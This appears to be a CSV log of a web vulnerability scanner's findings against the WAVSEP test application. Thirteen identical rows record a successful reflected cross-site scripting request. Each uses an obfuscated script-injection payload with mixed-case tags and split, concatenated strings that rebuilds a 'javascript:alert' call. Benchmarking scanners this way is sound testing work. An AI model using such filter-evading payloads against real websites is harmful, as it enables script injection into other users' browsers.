True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
True,GET,"http://10.65.203.66/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp?userinput=1""><sCRipt>location=""jAvas""%2b""Cript:ale""%2b""rt%2""%2b""812%2""%2b""9""</sCrIpt><kid var=""",/wavsep/active/RXSS-Detection-Evaluation-GET/Case01-Tag2HtmlPageScope.jsp,,alert,auto
